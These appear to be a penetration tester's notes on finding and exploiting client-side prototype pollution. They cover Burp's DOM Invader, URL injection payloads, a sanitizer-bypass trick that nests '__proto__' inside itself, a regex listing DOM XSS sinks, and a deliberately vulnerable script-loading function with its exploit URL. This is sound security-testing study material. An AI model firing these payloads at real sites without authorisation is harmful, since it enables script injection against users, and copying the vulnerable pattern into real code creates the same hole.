[#](#) Dom Invader

## Prototype Pollution (DOM Invader)

Note: sometimes there's sanitizer blocking the detection (see manual)

1. Turn On Dom Invader
2. Attack -> Turn On Prototype Attacks
3. Browse normally the app and check the Dom tab
4. Scan for gadget -> Exploit -> If Not working, look at the sink value -> Any trailing caracter -> Add - or ; after the payload

## Manual

Find Prototype Source:

1. Prototype pollution vectors
2. 
    ```
    /?__proto__.foo=bar
    /?__proto__[foo]=bar
    /?constructor.prototype.foo=bar
    ```
3. Console: `Object.prototype`

    Injection

    `{foo: 'bar', __defineGetter__: ƒ, __defineSetter__: ƒ, hasOwnProperty: ƒ, __lookupGetter__: ƒ, …}`

    No Injection:

    `{ __defineGetter__: ƒ, __defineSetter__: ƒ, hasOwnProperty: ƒ, __lookupGetter__: ƒ, …}`

        Is there a santizer?

            ```
            // Vulnerability: not recurrent replace
            // Exploit: __pro__proto__to__ (i.e.: sandwich)
            
            function sanitizeKey(key) {
                let badProperties = ['constructor','__proto__','prototype'];
                for(let badProperty of badProperties) {
                    key = key.replaceAll(badProperty, '');
                }
                return key;
            }
            ```
            
Find a Sink:

```
(document\.|window\.)(write|writeln|createElement|domain)|location|eval|setTimeout|setInterval|innerHTML|outerHTML|insertAdjacentHTML|window\.open|onevent|Function
```


```
async function searchLogger() {

    // Object
    
    let config = {params: deparam(new URL(location).searchParams.toString())};
    if(config.transport_url) {
    
        // Sink -> /?__proto__[transport_url]=data:,alert(1);
        
        let script = document.createElement('script');
        script.src = config.transport_url;
        document.body.appendChild(script);
    }
    if(config.params && config.params.search) {
        await logQuery('/logger', config.params);
    }
}
```
